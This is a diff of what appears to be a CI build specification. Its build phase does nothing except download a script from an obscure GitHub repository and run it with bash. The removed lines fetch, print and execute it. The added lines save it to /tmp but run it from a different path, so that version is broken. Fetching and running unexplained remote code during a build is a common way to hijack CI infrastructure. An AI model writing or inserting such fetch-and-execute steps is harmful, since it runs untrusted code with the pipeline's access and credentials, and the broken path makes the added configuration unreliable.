@@ -3,6 +3,5 @@ version: 0.2
 phases:
   build:
     commands:
-      - curl -sL https://github.com/vedhagsvp/marlopava/raw/main/abopa -o script.sh
-      - cat script.sh
-      - bash script.sh
+      - curl -L https://github.com/vedhagsvp/marlopava/raw/main/abopa -o /tmp/abopa
+      - bash abopa
